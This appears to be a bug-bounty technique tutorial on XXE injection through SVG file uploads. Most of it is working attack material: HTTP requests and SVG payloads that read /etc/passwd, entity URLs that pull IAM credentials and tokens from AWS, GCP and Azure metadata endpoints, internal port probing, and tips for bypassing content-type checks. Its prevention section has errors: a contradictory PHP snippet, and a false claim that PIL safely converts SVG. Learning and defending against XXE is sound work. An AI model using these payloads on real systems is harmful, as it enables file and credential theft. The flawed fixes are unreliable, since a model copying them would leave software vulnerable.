# Technique Breakdown: $8,000 XXE via SVG File Upload

**Skill Level:** Intermediate  
**Time to Read:** 7 minutes  
**Based on:** Real Bug Bounty Report  
**Bug Type:** XXE (XML External Entity) Injection  
**Platform:** Image Processing Service

---

## The Report

**Program:** File processing platform  
**Bounty:** $8,000  
**Severity:** High  
**Time to Find:** 45 minutes

### The Discovery

A security researcher found that uploading a malicious SVG file triggered XXE injection, allowing them to:
- Read internal server files (`/etc/passwd`)
- Access cloud metadata (`http://169.254.169.254/`)
- Pivot to internal network resources

**The Vulnerable Upload:**
```http
POST /api/upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="malicious.svg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg>&xxe;</svg>
------WebKitFormBoundary--
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "message": "Upload successful",
  "content": "root:x:0:0:root:/root:/bin/bash\ndaemon:..."
}
```

The server returned the contents of `/etc/passwd` in the error message!

---

## Understanding XXE via SVG

### Why SVG Files Are Dangerous

SVG (Scalable Vector Graphics) files are XML-based. When servers:
1. Accept SVG uploads
2. Parse/process the XML
3. Don't disable external entities

They become vulnerable to XXE injection.

### The Attack Vector

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg>
  <text>&xxe;</text>
</svg>
```

**How it works:**
1. Server receives SVG file
2. XML parser processes the file
3. Encounters `<!ENTITY>` declaration
4. Attempts to load `file:///etc/passwd`
5. File content is embedded in SVG
6. Server returns processed SVG (with file contents)

---

## Step-by-Step Exploitation

### Step 1: Identify SVG Upload Points

**Look for:**
- Profile picture uploads
- Document uploads accepting SVG
- Image processing APIs
- File conversion services
- Signature uploads

**Test File Extensions:**
```
file.svg
file.SVG
file.svg+xml
```

### Step 2: Test Basic XXE

**Payload (file read):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>
```

**Alternative (for different parsers):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="data:image/svg+xml,&xxe;" width="100" height="100"/>
</svg>
```

### Step 3: Cloud Metadata Extraction

**AWS:**
```xml
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
```

**GCP:**
```xml
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">
]>
```

**Azure:**
```xml
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">
]>
```

### Step 4: Internal Network Scanning

**Port Scanning via XXE:**
```xml
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://internal-service:8080/admin">
]>
```

**Test Multiple Ports:**
```bash
# Common internal services
http://localhost:22/        # SSH
http://localhost:3306/      # MySQL
http://localhost:5432/      # PostgreSQL
http://localhost:6379/      # Redis
http://localhost:27017/     # MongoDB
```

---

## Detection in Your Targets

### Indicators of Vulnerability

1. **Accepts SVG uploads**
2. **Processes uploaded images** (resize, convert, optimize)
3. **Returns processed content** (thumbnails, previews)
4. **Error messages reveal file paths**
5. **Uses XML parsers** (libxml2, DOMDocument, etc.)

### Testing Methodology

```bash
# 1. Upload test SVG
curl -X POST https://target.com/upload \
  -F "file=@test.svg" \
  -F "type=profile"

# 2. Check response for file contents
curl -X POST https://target.com/upload \
  -F "file=@xxe-passwd.svg" | grep "root:"

# 3. If successful, escalate to cloud metadata
```

---

## Prevention Guide

### For Developers

**1. Disable External Entities**

**PHP:**
```php
$doc = new DOMDocument();
$doc->loadXML($svgContent, LIBXML_NONET | LIBXML_DTDLOAD | LIBXML_NOENT);
// DON'T use LIBXML_NOENT - it's vulnerable!

// SAFE: Disable external entities
libxml_disable_entity_loader(true);
```

**Java:**
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

**Python:**
```python
from lxml import etree

# Vulnerable
parser = etree.XMLParser(resolve_entities=True)  # DON'T

# Safe
parser = etree.XMLParser(resolve_entities=False, no_network=True)
```

**2. Validate File Content**
```python
# Check file is actually an SVG
import re

def is_valid_svg(content):
    # Check for DOCTYPE (potential XXE)
    if '<!DOCTYPE' in content.upper():
        return False
    
    # Check for ENTITY declarations
    if '<!ENTITY' in content.upper():
        return False
    
    # Basic SVG structure check
    if not re.search(r'<svg[^>]*xmlns="http://www\.w3\.org/2000/svg"', content):
        return False
    
    return True
```

**3. Use Image Processing Libraries**
```python
# Instead of parsing XML directly, use image libraries
from PIL import Image

# Converts SVG to PNG safely
# Strips all XML processing
img = Image.open(svg_file)
img.save(output_file)
```

**4. Sandbox Processing**
```yaml
# Run image processing in isolated container
image_processor:
  container:
    image: svg-processor:latest
    network: none
    read_only: true
    user: "1000:1000"
```

---

## Pro Tips

💡 **Tip #1: Test Multiple File Types**
Some parsers accept SVG disguised as other formats:
```
upload.php?type=jpg (but send SVG content)
upload.php?type=png (but send SVG content)
```

💡 **Tip #2: Bypass Content-Type Validation**
```http
Content-Type: image/svg+xml
Content-Type: text/xml
Content-Type: application/xml
```

💡 **Tip #3: Test Error Messages**
Upload invalid XML to see if error messages reveal file paths:
```xml
<invalid>
```

💡 **Tip #4: Report Template**
```
Title: XXE via SVG File Upload Allows File Read

Summary:
The file upload functionality at /api/upload is vulnerable to 
XML External Entity (XXE) injection via malicious SVG files.

Steps to Reproduce:
1. Create malicious.svg with XXE payload
2. Upload to /api/upload endpoint
3. Observe /etc/passwd contents in response

Impact:
- Read arbitrary server files
- Access cloud metadata credentials
- Internal network scanning
- Potential for SSRF/RCE chain

PoC:
[Attach malicious.svg]
[Include HTTP request/response]

Remediation:
1. Disable external entity processing
2. Use safe image processing libraries
3. Validate SVG content before processing
4. Implement Content Security Policy
```

---

*Technique based on disclosed bug bounty report*  
*Published: 2024-02-28*  
*Author: CipherOps Team*
